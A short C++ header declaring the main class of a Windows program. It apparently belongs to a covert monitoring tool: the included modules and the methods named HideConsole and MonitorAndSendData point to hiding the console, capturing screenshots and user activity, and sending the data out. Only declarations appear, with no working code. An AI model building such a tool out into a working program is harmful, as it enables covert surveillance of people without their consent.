#pragma once
#include <windows.h>
#include <string>
#include <thread>
#include <chrono>
#include <gdiplus.h>
#include "RegistryManager.h"
#include "UserInfo.h"
#include "NetworkUtils.h"
#include "TimeUtils.h"
#include "ScreenshotCapture.h"
#include "DataSender.h"
#include "ActivityMonitor.h"

#pragma comment(lib, "gdiplus.lib")

class App {
public:
    static void Run();

private:
    static std::wstring GetExecutablePath();
    static void HideConsole();
    static void MonitorAndSendData();
};
